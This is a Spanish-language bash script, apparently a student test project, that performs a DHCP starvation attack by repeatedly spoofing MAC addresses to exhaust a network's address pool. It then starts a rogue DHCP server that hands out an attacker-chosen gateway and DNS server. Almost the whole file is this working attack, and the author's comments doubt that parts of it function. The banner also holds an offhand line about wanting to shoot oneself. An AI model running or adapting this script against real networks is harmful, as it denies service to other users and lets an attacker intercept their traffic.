#!/bin/bash

# Variables de Control
mac='60:a4:b7:b2'
cont1=01
cont2=01
# Intro del programa...
clear
echo "



                        DHCP_Atack_ver9
                        Cortesia de Javier Medina.



                        Son las 3 de la mañana y me quiero pegar un tiro.
                        Ayuda.


"
echo "Para ejecutar este script necesitas ser superusuario y tener el NetworkManager desabilitado (systemctl stop NetworkManager)"
read -p "Introduce tu targeta de red: " enp0s
read -p "Tienes el servicio DHCP iniciado (dhcpcd $enp0s)? (S/N):  " case1
case $case1 in
        [sS][iI]|[sS])
                echo "Perfecto, DHCP activo"
                ;;
        [nN][oO]|[nN])
                echo "Vale, iniciando dhcp"
                dhcpcd $enp0s
                ;;
        *)
                echo "Llevo 5horas programando esto para que tu vengas y te lo carges"
		exit
                ;;
esac
ipori=$(hostname -I | cut -d' ' -f1)
mascara=$(ip a l | grep $ipori | cut -d'/' -f2 | cut -d' ' -f1)
# Un while true
while true
do
        #Matamos, renovamos y volvemos a pedir
        kill -9 $(pidof dhcpcd)
        ip l s dev $enp0s down
        ip l s dev $enp0s address $mac:$cont1:$cont2
        dhcpcd $enp0s
        ip=$(hostname -I)
        #Ns si funciona esto pero tendría que detectar la apipa y crear el servidor DHCP
        #Se ve que si funciona. Bien...
        if [[ $ip == 169* ]]; then

                ip l s dev $enp0s down
                ip l s dev $enp0s up
                ip a a dev $enp0s $ipori/24
                clear
                echo "


                        Servidor DHCP original vaciado, vamos a crear uno falso?



                "
                read -p "Introduce tu red:" red
                read -p "Introduce el rango de IPs (min max)" range
                read -p "Introduce la gateway:" gateway
                read -p "Introduce DNS:" dns
                echo "
		default-lease-time 600;
                max-lease-time 7200;
                subnet $red netmask 255.255.255.0 {
                 range $range;
                 option routers $gateway;
                 option domain-name-servers $dns;
                }
                " >> /etc/dhcp/dhcpd.conf
                systemctl start isc-dhcp-server
                systemctl status isc-dhcp-server
                exit
        fi
        ((cont1++))
        ((cont2++))
done

##      Llevo demasiado tiempo haciendo esto, no se ni si el vaciador de DHCP funciona ya que el mi servidor lo está bloqueando
##      (No será muy buen script...).   Almenos detecta la APIPA y me para el bucle, en fin... Un buen proyecto de prueba jajaja.
##      ;)
































